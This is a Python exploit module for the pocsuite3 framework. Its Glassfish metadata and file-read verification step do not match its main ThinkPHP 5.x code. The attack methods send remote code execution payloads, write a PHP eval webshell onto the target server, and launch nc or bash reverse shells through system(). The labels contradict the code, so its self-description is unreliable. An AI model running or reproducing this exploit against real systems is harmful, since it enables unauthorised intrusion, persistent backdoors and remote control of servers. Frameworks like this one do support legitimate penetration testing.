"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = '97715'  # ssvid
    version = '1.0'
    author = ['vikingar']
    vulDate = '2023-01-01'
    createDate = '2023-01-01'
    updateDate = '2023-01-01'
    references = ['https://www.seebug.org/vuldb/ssvid-97715']
    name = 'Glassfish 任意文件读取漏洞'
    appPowerLink = 'http://www.thinkphp.cn/'
    appName = 'thinkphp'
    appVersion = 'thinkphp5.1.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = 'Glassfish 任意文件读取漏洞'
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = 'Glassfish 任意文件读取漏洞'

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _check(self, url):
        flag = 'Registered PHP Streams'
        data = OrderedDict([
            ("function", "call_user_func_array"),
            ("vars[0]", "phpinfo"),
            ("vars[1][]", "-1")
        ])
        payloads = [
            r"/?s=admin/\think\app/invokefunction",
            r"/admin.php?s=admin/\think\app/invokefunction",
            r"/index.php?s=admin/\think\app/invokefunction",
            r"/?s=index/\think\Container/invokefunction",
            r"/index.php?s=index/\think\Container/invokefunction",
            r"/index.php?s=index/\think\app/invokefunction"
        ]
        for payload in payloads:
            vul_url = url + payload
            r = requests.post(vul_url, data=data)

            if flag in r.text:
                return payload, dict(data)
        return False

    def _verify(self):
        result = {}
        payload_url = self.url
        linux_payload = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
        win_payload = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
        res_linux = requests.get(payload_url + linux_payload)
        res_win = requests.get(payload_url + win_payload)
        try:
            if res_linux.status_code == 200 or res_win.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = payload_url
                result['VerifyInfo']['Postdata'] = linux_payload
        except Exception as e:
            pass
        return self.parse_output(result)

    def _attack(self):
        result = {}
        filename = random_str(6) + ".php"
        webshell = r'''<?php echo "green day";@eval($_POST["pass"]);?>'''

        p = self._check(self.url)
        if p:
            data = p[1]
            data["vars[1][]"] = "echo%20%27{content}%27%20>%20{filename}".format(filename=filename,
                                                                                 content=quote(webshell))
            data["vars[0]"] = "system"
            vulurl = self.url + p[0]
            requests.post(vulurl, data=data)
            r = requests.get(self.url + "/" + filename)
            if r.status_code == 200 and "green day" in r.text:
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = self.url + "/" + filename
                result['ShellInfo']['Content'] = webshell
        if not result:
            vulurl = self.url + r"/index.php?s=index/\think\template\driver\file/write&cacheFile={filename}&content={content}"
            vulurl = vulurl.format(filename=filename, content=quote(webshell))
            requests.get(vulurl)
            r = requests.get(self.url + "/" + filename)
            if r.status_code == 200 and "green day" in r.text:
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = self.url + "/" + filename
                result['ShellInfo']['Content'] = webshell

        return self.parse_output(result)

    def _shell(self):
        # cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        cmd = self.get_option("command")
        p = self._check(self.url)
        if p:
            data = p[1]
            data["vars[0]"] = "system"
            data["vars[1][]"] = cmd
            vulurl = self.url + p[0]
            requests.post(vulurl, data=data)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
